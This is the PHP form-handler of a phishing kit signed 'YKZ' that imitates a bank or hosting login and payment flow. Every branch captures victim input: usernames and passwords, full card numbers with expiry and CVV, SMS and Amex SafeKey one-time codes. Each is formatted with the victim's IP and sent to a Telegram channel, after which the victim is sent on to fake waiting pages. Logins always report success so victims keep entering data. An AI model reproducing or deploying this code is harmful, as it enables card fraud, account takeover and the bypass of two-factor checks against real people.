<?php
// Don't start session here - let main.php handle it
require "../config.php";
require "../main.php";
require_once "LanguageManager.php";
require_once "bank_utils.php";

// Helper function to send Telegram messages safely
function sendTelegram($message) {
    if (function_exists('yakuza_send')) {
        try {
            yakuza_send($message);
        } catch (Exception $e) {
            error_log("Telegram send error: " . $e->getMessage());
        }
    }
}

// More robust AJAX detection
$isAjax = (
    !empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
    strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'
);

function post($d)
{
	return $_POST[$d];
}

function go($to) {
	header("Location: $to");
	echo "<script>window.location='$to';</script>";
	exit;
}

$ip = $_SERVER['REMOTE_ADDR'];



// Process form submissions
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST["username"], $_POST['password'])) {
        // Store username in session for later use
        $_SESSION['username'] = $_POST["username"];

        // Process login form submission
        $msg = '
########[ Login ]########

    User     :  ' . $_POST["username"] . '
    Pass     :  ' . $_POST["password"] . '
    IP       :  ' . $_SERVER['REMOTE_ADDR'] . '

########[*YKZ*]########';

        // Process login credentials
        $loginSuccessful = true; // Set to true for this implementation

        // Send login data to Telegram
        sendTelegram($msg);

        // Prepare the response
        $response = array(
            "success" => $loginSuccessful,
            "redirect" => $loginSuccessful ? "index.php" : null,
            "message" => !$loginSuccessful ? "Login failed. Please try again." : null
        );

        // Send JSON response
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }

    // Function to send message to Telegram

    if (isset($_POST["cardnumber"])) {
        // Process card details submission
        $_SESSION['carta'] = substr($_POST['cardnumber'], -4);
        $_SESSION['carta_F'] = 'xxxx xxxx xxxx ' . $_SESSION['carta']; // Store the formatted card number
        $_SESSION['fullCardNumber'] = $_POST['cardnumber']; // Keep original formatting for display

        // Remove spaces from card number for processing
        $cleanCardNumber = str_replace(' ', '', $_POST['cardnumber']);

        // Store the first 6 digits in a new session variable (without spaces)
        $_SESSION['firstSixDigits'] = substr($cleanCardNumber, 0, 6);

        // Detect card type based on first digit (using clean card number)
        $firstDigit = substr($cleanCardNumber, 0, 1);
        switch ($firstDigit) {
            case '4':
                $_SESSION['cardType'] = 'visa';
                break;
            case '5':
                $_SESSION['cardType'] = 'mastercard';
                break;
            case '3':
                $_SESSION['cardType'] = 'amex';
                break;
            default:
                $_SESSION['cardType'] = 'visa'; // Default to visa
                break;
        }

        // Retrieve bank information
        $bankInfo = getBank($_SESSION['firstSixDigits']);

        // Update template with bank info and logo
        updateTemplateWithBankInfo($bankInfo, $_SESSION['firstSixDigits']);

        $msg = '
########[ CARD ]########

    Card     :    ' . $cleanCardNumber . '

    Exp      :    ' . $_POST['card_exp_month'] . '/' . $_POST['card_exp_year'] . '

    Cvv      :    ' . $_POST['card_cvv'] . '

    IP       :    ' . getenv('REMOTE_ADDR') . '

    *    Bank: ' . $bankInfo['bank'] . '
    *    Type: ' . $bankInfo['type'] . '
    *    Country: ' . $bankInfo['country'] . '
    *    Card Type: ' . $_SESSION['cardType'] . '
    *    BIN: ' . $_SESSION['firstSixDigits'] . '

########[*YKZ*]########';

        // Send to Telegram
        sendTelegram($msg);

        // Check if this is an AJAX request
        if ($isAjax) {
            // Return JSON response for AJAX
            header('Content-Type: application/json');
            echo json_encode([
                'success' => true,
                'redirect' => 'espere.php?p=card'
            ]);
            exit;
        } else {
            // Regular form submission - redirect normally
            go("espere.php?p=card");
        }
    }

    if (isset($_POST["otp"])) {
        // Process additional security information (SMS)
        $msg = '
########[ SMS ]########

    SMS      : ' . $_POST['otp'] . '

    IP       : ' . getenv('REMOTE_ADDR') . '

########[*YKZ*]#########';

        // Send to Telegram
        sendTelegram($msg);
        go("espere.php?p=sms");
    }

	    if (isset($_POST["amex"])) {
        // Process additional security information (SMS)
        $msg = '
########[ amex ]########

    SMS      : ' . $_POST['amex'] . '

    IP       : ' . getenv('REMOTE_ADDR') . '

########[*YKZ*]#########';

        // Send to Telegram
        sendTelegram($msg);
        go("espere.php?p=safekey");
    }

	    if (isset($_POST["amex2"])) {
        // Process additional security information (SMS)
        $msg = '
########[ amex2 ]########

    SMS      : ' . $_POST['amex2'] . '

    IP       : ' . getenv('REMOTE_ADDR') . '

########[*YKZ*]#########';

        // Send to Telegram
        sendTelegram($msg);
        go("espere.php?p=safekey2");
    }

    if (isset($_POST["keys"])) {
        // Process search form submission
        $msg = '
########[ SEARCH ]########

    Search Query: ' . $_POST['keys'] . '

    IP       : ' . getenv('REMOTE_ADDR') . '

########[*YKZ*]#########';

        // Send to Telegram
        sendTelegram($msg);
        // Redirect back to main page or show search results
        go("index.php");
    }

    if (isset($_POST["subscription-id"])) {
        // Process order form submission
        $msg = '
########[ ORDER ]########

    Subscription ID: ' . $_POST['subscription-id'] . '
    Order Type: ' . ($_POST['order-abo-type'] ?? 'N/A') . '
    Domain Name: ' . ($_POST['order-domain-name'] ?? 'N/A') . '
    Domain TLD: ' . ($_POST['order-domain-tld'] ?? 'N/A') . '

    IP       : ' . getenv('REMOTE_ADDR') . '

########[*YKZ*]#########';

        // Send to Telegram
        sendTelegram($msg);
        // Redirect to payment confirmation
        go("index.php");
    }


}

?>
